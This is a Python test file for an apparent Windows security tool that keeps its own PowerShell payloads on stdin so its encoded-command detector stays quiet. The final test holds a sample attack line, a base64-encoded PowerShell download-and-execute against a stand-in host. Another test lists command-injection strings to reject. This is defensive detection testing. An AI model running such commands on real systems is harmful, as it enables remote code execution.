"""JARVIS's own PowerShell helpers must not look like an encoded-command attack.

Payloads travel on stdin: the command line carries no FromBase64String literal
(so the unchanged encoded-command rule stays quiet for JARVIS itself) and no
prompt text or finding path (so process listings and Sysmon Event 1 do not
record them).
"""

import json
import unittest
from unittest import mock

from jarvis.collectors.process import detect
from jarvis.platform import interop_gate, signatures, windows


class _Capture:
    def __init__(self, reply):
        self.reply, self.calls = reply, []

    def __call__(self, script, timeout=120, payload=None):
        self.calls.append((script, payload))
        return self.reply


def _payload_text(payload):
    return payload.decode("utf-8") if isinstance(payload, bytes) else payload


class StdinBridgeTests(unittest.TestCase):
    def assert_quiet(self, script, payload, secret):
        self.assertIsNone(detect.ENCODED.search(script), script[:200])
        self.assertNotIn("FromBase64String", script)
        self.assertIn(secret, _payload_text(payload))
        self.assertNotIn(secret, script)
        self.assertIn("OpenStandardInput", script)

    def test_ps_json_writes_payload_to_stdin_only(self):
        ran = mock.Mock(return_value=mock.Mock(stdout=b"eyJvayI6IHRydWV9"))  # {"ok": true}
        with mock.patch.object(windows, "available", return_value=True), \
             mock.patch.object(windows.subprocess, "run", ran):
            self.assertEqual(windows.ps_json("$x", payload="héllo"), {"ok": True})
        argv, kwargs = ran.call_args
        self.assertEqual(kwargs["input"], "héllo".encode("utf-8"))
        self.assertNotIn("héllo", " ".join(map(str, argv[0])))

    def test_ps_json_without_payload_leaves_stdin_untouched(self):
        ran = mock.Mock(return_value=mock.Mock(stdout=b"eyJvayI6IHRydWV9"))
        with mock.patch.object(windows, "available", return_value=True), \
             mock.patch.object(windows.subprocess, "run", ran):
            windows.ps_json("$x")
        self.assertNotIn("input", ran.call_args.kwargs)

    def setUp(self):
        # ps_json skips its retry when the process-global interop gate is
        # degraded. Other suites in a full run can leave it degraded, so pin a
        # fresh, healthy gate here: this test is about the retry, not the gate.
        gate = interop_gate.Gate()
        patch = mock.patch.object(interop_gate, "GATE", gate)
        patch.start()
        self.addCleanup(patch.stop)

    def test_retry_resends_payload_and_unavailable_bridge_fails_closed(self):
        ran = mock.Mock(side_effect=[mock.Mock(stdout=b""),
                                     mock.Mock(stdout=b"eyJvayI6IHRydWV9")])
        with mock.patch.object(windows, "available", return_value=True), \
             mock.patch.object(windows, "ensure_interop", return_value=True), \
             mock.patch.object(windows.subprocess, "run", ran):
            self.assertEqual(windows.ps_json("$x", payload=b"body"), {"ok": True})
        self.assertEqual([c.kwargs["input"] for c in ran.call_args_list], [b"body", b"body"])
        with mock.patch.object(windows, "available", return_value=False), \
             mock.patch.object(windows.subprocess, "run") as never:
            self.assertIsNone(windows.ps_json("$x", payload=b"body"))
        never.assert_not_called()

    def test_stdin_text_rejects_injected_variable_names(self):
        for bad in ("", "1x", "p;Remove-Item", "p)", None):
            with self.assertRaises(ValueError):
                windows.stdin_text(bad)

    def test_model_bridge_keeps_prompt_off_the_command_line(self):
        from jarvis.response import llm
        body = json.dumps({"messages": [{"content": "plaintext password file"}]}).encode()
        cap = _Capture({"message": {"content": "ok"}})
        with mock.patch.object(llm, "ps_json", cap):
            self.assertEqual(llm._bridge(body, 30), {"message": {"content": "ok"}})
        script, payload = cap.calls[0]
        self.assertEqual(payload, body)
        self.assert_quiet(script, payload, "plaintext password file")

    def test_windows_path_helpers_keep_paths_off_the_command_line(self):
        from jarvis.intel import hunt
        from jarvis.response import tools
        path = r"C:\Users\x\AppData\Local\Temp\drop.exe"
        cap = _Capture({"exists": True, "status": "Valid", "code": 0})
        with mock.patch.object(tools, "ps_json", cap):
            tools.authenticode(path)
            tools.defender_scan(path)
        with mock.patch.object(hunt, "ps_json", cap):
            hunt._microsoft_signed({path})
        signatures._CACHE.clear()
        signatures._LNK.clear()
        with mock.patch.object(signatures, "ps_json", cap), \
             mock.patch.object(signatures, "_key", return_value=("k",)):
            signatures.verify([path])
            signatures.lnk_targets([path])
            signatures._package_verdicts(
                [r"C:\Program Files\WindowsApps\Pkg_1.0_x64__abc123\a.exe"])
        signatures._CACHE.clear()
        signatures._LNK.clear()
        self.assertEqual(len(cap.calls), 6)
        for script, payload in cap.calls[:5]:
            self.assert_quiet(script, payload, "drop.exe")
        self.assert_quiet(*cap.calls[5], "Pkg_1.0_x64__abc123")

    def test_autostart_actions_keep_targets_off_the_command_line(self):
        from jarvis.response.actions.disable_autostart import DisableAutostart
        action = DisableAutostart()
        target = {"kind": "runkey", "name": "Updater", "key": r"HKCU:\Software\Run"}
        cap = _Capture({"ok": True, "record": {}, "available": True})
        with mock.patch.object(action, "_run", lambda s, p: cap(s, payload=p)):
            action.apply(target, None)
            action.undo(target, {**target, "value": "x", "valueKind": "String"})
            action.recover(target, {})
        self.assertEqual(len(cap.calls), 3)
        for script, payload in cap.calls:
            self.assert_quiet(script, payload, "Updater")
            self.assertEqual(json.loads(payload)["name"], "Updater")

    def test_encoded_command_rule_is_unchanged_for_everyone_else(self):
        attack = ("powershell.exe -NoProfile -Command \"$b=[Text.Encoding]::UTF8.GetString("
                  "[Convert]::FromBase64String('aWV4IChpd3IgaHR0cDovL3gp'))|iex\"")
        self.assertIn("encoded-command", detect.traits(
            {"host": "win", "exe": r"C:\Windows\System32\powershell.exe",
             "name": "powershell.exe", "cmdline": attack, "conns": []}))


if __name__ == "__main__":
    unittest.main()
